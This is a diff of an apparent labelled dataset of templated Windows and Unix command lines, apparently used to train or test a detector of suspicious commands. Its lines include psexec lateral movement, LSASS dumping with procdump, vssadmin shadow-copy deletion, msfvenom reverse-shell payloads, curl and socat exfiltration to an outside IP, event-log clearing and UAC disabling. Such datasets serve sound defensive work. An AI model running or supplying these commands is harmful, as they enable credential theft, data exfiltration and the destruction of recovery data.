@@ -1,54 +1,302 @@
-1	cmd.exe /c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
-1	powershell -c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
-1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
-1	mail -s ${email_subject} ${username}@${domain} < mail.txt
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
-1	cat email.txt | mutt -s ${email_subject} ${username}@${domain}
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
-1	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
-1	sendmail ${username}@${domain} < mail.txt
-1	echo ${email_content} | sendmail ${username}@${domain}
-1	cat email.txt | sendmail ${username}@${domain}
-1	ssmtp ${username}@${domain} < mail.txt
-1	echo -e ${email_content} | ssmtp ${username}@${domain}
-1	cat email.txt | ssmtp ${username}@${domain}
-1	mstsc /v:${ip_address} /f
-1	mstsc /v:${ip_address}
-1	mstsc /v:${computer_name} /f
-1	mstsc /v:${computer_name}
-1	SharpRDP.exe computername=${ip_address} command="${command_to_execute}" username=${domain}\${username} password=${password}
-1	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
-1	psexec \\${ip_address} -i ${command_to_execute}
-1	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s
-1	psexec \\${ip_address} -u ${username} -p ${password} script.txt
-1	plink -ssh ${ip_address} -l ${username} -pw ${password}
-1	plink ${username}@${ip_address}
-0	echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-0	plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+1	psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+1	cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+1	cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+1	cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+1	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+1	psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+1	cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+1	powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+1	psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
+1	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
+1	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s
+1	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s
+1	cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+0	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
+0	mstsc /v:${ip_address} /f /multimon
+0	powershell -c "certutil -encode -Unicode error.txt encode.txt"
+0	powershell -c "sdelete -f -q -accepteula ${local_file_path}"
+0	plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+0	nmap -sV ${ip_address}
+0	powershell -c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+0	plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	powershell -c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	mstsc.exe /v:${ip_address} /f /admin
+0	cmd /c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+0	sdelete.exe -f -q -accepteula ${local_file_path}
+0	powershell -c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
+0	powershell -c "choco install psexec"
+0	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
+0	cmd /c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+0	powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	powershell -c "mstsc /v:${ip_address} /remoteGuard"
+0	rm -r ${local_file_path} 2> /dev/null
+0	sdelete ${local_file_path}
+0	nmap -p- -sC ${ip_address}
+0	certutil -encode -UnicodeText -f error.txt encode.txt
+0	powershell -c "sdelete.exe -f -accepteula ${local_file_path}"
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
+0	cmd /c "wmic.exe os get Caption"
+0	powershell -c "certutil -encode -UnicodeText -v -f error.txt encode.txt"
 0	powershell -c "vssadmin.exe delete shadows /all /quiet"
-0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
-0	msfvenom -p cmd/unix/reverse_bash HOST=${ip_address} LPORT=${port} -f raw -o reverse.sh
-0	scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}
-0	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f jsp -o reverse.jsp
-0	powershell -c "cipher.exe /w:C:"
-0	nanodump.x64.exe -w lsassdump.dmp
-0	SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\${username} password=${password}
-0	Compress-Archive -Path ${source_file_path} -DestinationPath ${destination_file_path} -Force
-0	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
-0	wmic /node:"${ip_address}" process call create "cmd.exe /c esentutl.exe /y /vss ${source_file_path} /d ${destination_file_path}"
-0	Copy-Item "${local_file_path}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
-0	reg SAVE HKLM\SYSTYEM ${local_file_path}
-0	rclone.exe copy C:\Users\Public\collect.7z ${account}:backup
-0	choco install putty
-0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
-0	nc -vn ${ip_address} ${port} < ${source_file_path}
-0	zip -er archive.zip ${source_directory}
-0	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
-0	scp ${username}@${ip_address}:${source_file_path} ${destination_file_path}
-0	cat ${source_file_path} | socat - TCP:${ip_address}:${port}
-0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
-0	powershell -c "vssadmin create shadow /for=C:"
-0	powershell -c "wmic shadowcopy call create Volume=C:"
-0	PsExec64.exe \\${ip_address} -s ${command_to_execute}
+0	cmd /c "7z a -slp -p ${destination_file_path} ${source_file_path}"
+0	powershell -c "sdelete -accepteula ${local_file_path}"
+0	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> &1
+0	cmd /c "vssadmin.exe Delete Shadows /all /Quiet"
+0	cmd /c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
+0	cmd /c "procdump -mm lsass.exe lsassdump.dmp"
+0	powershell -c "mstsc /v:${ip_address} /remoteGuard"
+0	netstat -r
+0	cmd /c "tasklist.exe"
+0	choco install -y rclone
+0	rmdir /q /s ${local_file_path}
+0	curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
+0	cmd /c "wmic os get Version"
+0	nmap -p- -sC -O -A ${ip_address} 2> error.log
+0	powershell -c "procdump.exe -accepteula -ma lsass.exe lsassdump.dmp"
+0	powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+0	del /f /p ${local_file_path}
+0	powershell -c "hostname"
+0	certutil -encode ${source_file_path} ${destination_file_path}
+0	powershell -c "mstsc /v:${ip_address} /f /public"
+0	cmd /c "7z a -slp -p ${destination_file_path} ${source_file_path}"
+0	plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	cmd /c "7z a ${destination_file_path} ${source_file_path} -p${password}"
+0	powershell -c "vssadmin delete shadows /all"
+0	nmap -p- ${ip_address} 2> /dev/null
+0	sc stop ${service_name}
+0	powershell -c "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	sdelete -q -accepteula ${local_file_path}
+0	rmdir /s /q ${local_file_path}
+0	wevtutil.exe cl security
+0	powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+0	powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+0	wmic.exe os get TotalVirtualMemorySize
+0	powershell -c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	cmd /c "7z a -slt ${destination_file_path} ${source_file_path} -p"
+0	powershell -c "vssadmin.exe delete shadows /all"
+0	msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
+0	certutil -encode -v error.txt encode.txt
+0	mstsc /v:${ip_address} /f /remoteGuard
+0	msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	powershell -c "mstsc.exe /v:${ip_address} /f /multimon"
+0	cmd /c "procdump.exe -mm lsass lsassdump.dmp"
+0	powershell -c "msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	powershell -c "netstat.exe"
+0	powershell -c "wevtutil.exe cl application"
+0	cmd /c "ipconfig /allcompartments"
+0	7z.exe a -p ${destination_file_path} ${source_file_path}
+0	7z.exe a -p${password} ${destination_file_path} ${source_file_path}
+0	cmd /c "sdelete.exe -s -q ${local_file_path}"
+0	powershell -c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
+0	certutil -encode -UnicodeText -v -f error.txt encode.txt
+0	powershell -c "sdelete -s -q ${local_file_path}"
+0	powershell -c "hostname.exe"
+0	vssadmin delete shadows /all /quiet
+0	cmd /c "vssadmin.exe Delete Shadows /all /quiet"
+0	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
+0	cmd /c "procdump -mm lsass lsassdump.dmp"
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
+0	cmd /c "vssadmin.exe Delete Shadows /All"
+0	cmd /c "choco install putty"
+0	cmd /c "plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+0	rm -r ${local_file_path} 2> &1
+0	cmd /c "wmic.exe os get FreePhysicalMemory"
+0	cmd /c "choco install putty"
+0	powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p${password}"
+0	powershell -c "taskkill /f /im ${process_name}"
+0	powershell -c "procdump.exe -mm lsass lsassdump.dmp"
+0	cmd /c "taskkill /F /IM ${process_name} /T"
+0	nmap -sP ${ip_address} 2> &1
+0	rm -f ${local_file_path}
+0	cmd /c "msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	powershell -c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+0	msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	cmd /c "taskkill.exe /f /im ${process_name}"
+0	powershell -c "taskkill.exe /F /IM ${process_name} /T"
+0	plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	powershell -c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+0	vssadmin.exe Delete Shadows /all /Quiet
+0	powershell -c "vssadmin.exe delete shadows /All /Quiet"
+0	powershell -c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
+0	powershell -c "mstsc.exe /v:${ip_address} /multimon"
+0	cmd /c "certutil -encode -UnicodeText -f error.txt encode.txt"
+0	cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	nmap -T5 ${ip_address}
+0	plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	mailx -s ${email_subject} ${username}@${domain} < mail.txt
+0	sdelete.exe -accepteula ${local_file_path}
+0	taskkill.exe /F /IM ${process_name}
+0	cmd /c "certutil -encode -v -f error.txt encode.txt"
+0	powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+0	powershell -c "certutil -encode -gmt ${source_file_path} ${destination_file_path}"
+0	sdelete.exe ${local_file_path}
+0	powershell -c "wmic.exe os get Version"
+0	powershell -c "taskkill /f /im ${process_name} /T"
+0	cmd /c "certutil -encode -Unicode error.txt encode.txt"
+0	powershell -c "vssadmin Delete Shadows /all /quiet"
+0	mstsc /v:${ip_address} /f /restrictedAdmin
+0	sdelete -s -q ${local_file_path}
+0	cmd /c "mstsc.exe /v:${ip_address} /remoteGuard"
+0	mstsc /v:${ip_address} /f /public
+0	powershell -c "ipconfig.exe /all"
+0	powershell -c "certutil -encode -Unicode -v -f error.txt encode.txt"
+0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+0	cmd /c "netstat.exe -a"
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> error.log
+0	powershell -c "msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	cmd /c "certutil -encode -gmt -v -f error.txt encode.txt"
+0	nmap -T5 ${ip_address} 2> &1
+0	cmd /c "wmic os get TotalVirtualMemorySize"
+0	plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+0	powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p"
+0	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
+0	plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	rm -rf ${local_file_path} 2> /dev/null
+0	powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	powershell -c "choco install 7zip"
+0	cmd /c "mstsc /v:${ip_address} /f /admin"
+0	msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	powershell -c "sdelete.exe -s ${local_file_path}"
+0	cmd /c "taskkill.exe /F /im ${process_name}"
+0	wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
+0	cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	powershell -c "wevtutil clear-log system"
